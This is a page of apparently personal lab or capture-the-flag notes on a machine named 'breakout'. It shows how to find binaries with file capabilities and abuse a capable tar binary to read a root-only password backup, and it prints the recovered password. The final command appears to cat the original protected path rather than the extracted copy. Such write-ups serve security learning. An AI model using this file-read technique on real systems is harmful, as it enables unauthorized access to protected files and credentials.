<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1 Scan for files with capabilities</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5.1 Scan for files with capabilities</h1><br/><br />1. Start scanning the file system for files with capabilities using <code>getcap -r /</code>   The -r flag tells getcap to search recursively, ‘/‘ to indicate that we want to search the whole system.<br />    The  output is usually filled with tens or hundreds of  “Operation not  supported” errors, making it hard to read. We can redirect errors to  /dev/null to get a cleaner output. More info <a href="https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/">here</a>.<br />    <br />    <div class="codebox"><div class="codebox">[cyber@breakout&nbsp;~<span style="color:#000000;font-weight:700">]</span><span style="color:#6a5acd;font-weight:400">$getcap</span>&nbsp;-r&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>&nbsp;2&gt;<span style="color:#a52a2a;font-weight:700">/</span>dev<span style="color:#a52a2a;font-weight:700">/</span>null</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/725-1.png" alt="images/725-1.png" /><br /><br />2. “tar” has the capacity of reading files. This means that we can read files using “tar”. We can do this by compressing the files and extracting them to read.<br /><br />3. Go to “/var/backups” and list the all files.<br />    <div class="codebox"><div class="codebox">[cyber@breakout&nbsp;~<span style="color:#000000;font-weight:700">]</span><span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups<br />[cyber@breakout&nbsp;~]<span style="color:#6a5acd;font-weight:400">$ls</span>&nbsp;-al</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/725-2.png" alt="images/725-2.png" /><br /><br />    As you can see above, “.old_pass.bak” file is only readable by the “root” user. Nevertheless, you have a binary that can read any file.<br /><br />4. Run the following commands to read the “.old_pass.bak” file.<br />    <div class="codebox"><div class="codebox">[cyber@breakout&nbsp;backups<span style="color:#000000;font-weight:700">]</span><span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>home<span style="color:#a52a2a;font-weight:700">/</span>cyber<br />[cyber@breakout&nbsp;~]$.<span style="color:#a52a2a;font-weight:700">/tar</span>&nbsp;-cf&nbsp;bak.tar&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups<span style="color:#a52a2a;font-weight:700">/</span>.old_pass.bak<br />[cyber@breakout&nbsp;~]<span style="color:#6a5acd;font-weight:400">$tar</span>&nbsp;-xf&nbsp;bak.tar<br />[cyber@breakout&nbsp;~]<span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>var<span style="color:#a52a2a;font-weight:700">/</span>backups<span style="color:#a52a2a;font-weight:700">/</span>.old_pass.bak</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/725-3.png" alt="images/725-3.png" /><br />    <br />    “<code>Ts&amp;4&amp;YurgtRX(=~h</code>”<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>